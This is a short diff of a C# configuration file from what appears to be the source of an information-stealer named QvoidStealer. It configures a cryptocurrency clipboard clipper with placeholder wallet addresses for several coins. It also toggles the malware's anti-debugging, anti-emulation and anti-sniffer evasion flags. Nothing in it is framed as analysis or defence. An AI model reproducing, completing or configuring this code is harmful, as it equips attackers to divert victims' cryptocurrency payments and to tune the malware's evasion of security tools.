@@ -9,10 +9,10 @@ namespace QvoidStealer.Main
         public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");
 
         public static bool Silent = false;
-        public static bool AntiWebSinffers = true;
-        public static bool AntiDebug = true;
+        public static bool AntiWebSinffers = false;
+        public static bool AntiDebug = false;
         public static bool AntiVM = false;
         public static bool AntiSandBoxie = false;
-        public static bool AntiEmulation = true;
+        public static bool AntiEmulation = false;
     }
 }
